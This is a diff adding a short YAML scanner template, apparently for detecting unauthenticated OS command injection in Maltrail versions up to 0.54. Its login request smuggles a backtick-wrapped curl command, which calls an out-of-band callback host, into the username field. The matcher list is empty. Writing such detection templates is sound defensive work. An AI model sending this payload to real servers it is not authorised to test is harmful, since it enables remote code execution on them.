@@ -1,0 +1,25 @@
+id: maltrail-rce
+brief:
+    title: Maltrail <= v0.54 - Unauthenticated OS Command Injection
+    by: pussycat0x
+    level: critical
+    about: The subprocess.check_output function in mailtrail/core/http.py contains a command injection vulnerability in the params.get("username")parameter.
+    label:
+        - huntr
+        - maltrail
+        - rce
+        - oast
+        - oos
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/login'
+      head:
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        Origin: '{{RootURL}}'
+        Referer: '{{RootURL}}'
+        X-Requested-With: XMLHttpRequest
+      body: username=;`curl {{interactsh-url}}`
+      signs: []
